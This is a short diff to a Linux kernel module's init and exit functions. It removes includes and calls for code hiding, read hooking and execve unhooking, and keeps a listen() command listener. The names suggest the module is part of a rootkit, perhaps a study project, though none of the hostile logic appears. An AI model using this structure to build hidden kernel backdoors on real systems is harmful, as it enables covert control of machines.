@@ -2,10 +2,6 @@
 #include <linux/kernel.h> /* Needed for KERN_INFO */
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
-//#include "process_hiding.h"
-//#include "file_hiding.h"
-#include "code_hiding.h"
-#include "read_hooking.h"
 #include "commands.h"
 #include "sysmap.h"
 
@@ -16,9 +12,6 @@ MODULE_LICENSE("GPL");
 
 static int __init mod_init(void)
 {
- // hook_read();
-
-  //gide_code();
   listen();
   printk(KERN_INFO "mod_init\n");
   return 0;
@@ -26,10 +19,7 @@ static int __init mod_init(void)
 
 static void __exit mod_exit(void)
 {
-  //unhook_execve();
-  //unhook_read();
   stop_listen();
-  unhide_code(NULL);
 }
 
 
